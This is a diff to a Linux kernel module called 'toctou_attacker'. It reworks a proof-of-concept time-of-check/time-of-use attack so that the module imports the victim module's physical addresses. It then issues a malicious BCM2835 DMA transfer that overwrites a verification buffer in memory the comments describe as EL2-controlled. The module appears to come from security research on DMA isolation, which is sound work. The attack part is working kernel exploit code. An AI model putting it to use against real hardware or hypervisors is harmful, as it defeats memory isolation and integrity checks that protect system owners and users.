@@ -23,15 +23,14 @@
 
 #define DRIVER_NAME "toctou_attacker"
 
+/* Import from victim module */
+extern unsigned long exported_sync_phys;
+extern unsigned long exported_verify_phys;
+
 /* Module parameters */
 static int auto_start = 0;
 module_param(auto_start, int, 0644);
 MODULE_PARM_DESC(auto_start, "Auto-start attack thread on module load");
-
-/* Attack target: physical address to write verification pattern */
-static unsigned long verify_phys = 0;
-module_param(verify_phys, ulong, 0644);
-MODULE_PARM_DESC(verify_phys, "Physical address of verification buffer (from victim)");
 
 /* Timing parameter */
 static int timing_poll = DEFAULT_TIMING_POLL_US;
@@ -51,7 +50,7 @@ static dma_addr_t attack_src_dma;
 static inline void sync_write(u32 offset, u32 value)
 {
     if (sync_flag_base) {
-        writel(value, sync_flag_base + offset);
+        writel(value, (void *)sync_flag_base + offset);
         wmb();
     }
 }
@@ -77,7 +76,7 @@ static void trigger_malicious_dma(void)
     u32 ti_flags;
     u32 dst_addr;
 
-    if (!secure_buffer_base || !verify_phys)
+    if (!secure_buffer_base || !exported_verify_phys)
         return;
 
     core1_buffer = secure_buffer_base + (1 * SECURE_BUFFER_SIZE_PER_CORE);
@@ -87,7 +86,7 @@ static void trigger_malicious_dma(void)
                BCM2835_DMA_TI_WAIT_RESP;
 
     /* Target: victim's verification buffer */
-    dst_addr = PHYS_TO_BUS(verify_phys);
+    dst_addr = PHYS_TO_BUS(exported_verify_phys);
 
     /* 
      * Write VALID malicious CB that DMA will actually execute:
@@ -141,19 +140,24 @@ static int __init toctou_attacker_init(void)
 {
     u32 *pattern;
 
-    /* Map sync flag memory */
-    sync_flag_base = ioremap(SYNC_FLAG_PHYS, SYNC_FLAG_SIZE);
-    if (!sync_flag_base) {
-        pr_err("[ATTACKER] Failed to map sync memory\n");
-        return -ENOMEM;
+    /* 
+     * Use sync memory exported by victim module.
+     * Victim must be loaded first.
+     */
+    if (!exported_sync_phys) {
+        pr_err("[ATTACKER] Victim module not loaded (exported_sync_phys=0)\n");
+        return -ENODEV;
     }
+    
+    sync_flag_base = (void __iomem *)phys_to_virt(exported_sync_phys);
+    pr_info("[ATTACKER] Using victim's sync at phys=0x%lx\n", exported_sync_phys);
 
-    /* Map secure buffer region */
+    /* Map secure buffer region (this is EL2-controlled memory) */
     secure_buffer_base = ioremap(SECURE_BUFFER_BASE_PHYS,
                                   SECURE_BUFFER_SIZE_PER_CORE * NUM_CORES);
     if (!secure_buffer_base) {
         pr_err("[ATTACKER] Failed to map secure buffer\n");
-        goto err_unmap_sync;
+        return -ENOMEM;
     }
 
     /* Allocate source buffer for malicious DMA payload */
@@ -181,14 +185,12 @@ static int __init toctou_attacker_init(void)
         }
     }
 
-    pr_info("[ATTACKER] Loaded: auto=%d, verify_phys=0x%lx, pattern=0x%x\n",
-            auto_start, verify_phys, VERIFY_PATTERN);
+    pr_info("[ATTACKER] Loaded: auto=%d, sync=0x%lx, verify=0x%lx\n",
+            auto_start, exported_sync_phys, exported_verify_phys);
     return 0;
 
 err_unmap_secure:
     iounmap(secure_buffer_base);
-err_unmap_sync:
-    iounmap(sync_flag_base);
     return -ENOMEM;
 }
 
@@ -205,8 +207,7 @@ static void __exit toctou_attacker_exit(void)
     if (secure_buffer_base)
         iounmap(secure_buffer_base);
 
-    if (sync_flag_base)
-        iounmap(sync_flag_base);
+    /* sync_flag_base is mapped via phys_to_virt, no iounmap needed */
 
     pr_info("[ATTACKER] Unloaded\n");
 }
